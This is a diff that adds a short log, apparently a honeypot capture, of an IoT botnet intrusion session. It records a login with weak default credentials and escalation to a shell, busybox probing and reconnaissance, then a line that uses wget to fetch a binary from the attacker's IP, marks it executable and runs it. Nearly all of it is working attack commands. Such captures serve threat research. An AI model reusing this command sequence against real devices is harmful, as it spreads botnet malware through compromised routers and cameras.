@@ -1,0 +1,13 @@
+from: 31.168.66.223:39124 user:admin1 password:password
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox UCAAI
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox UCAAI
+tftp; wget; /bin/busybox UCAAI
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox UCAAI
+rm .s; wget http://31.168.66.223:39175/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
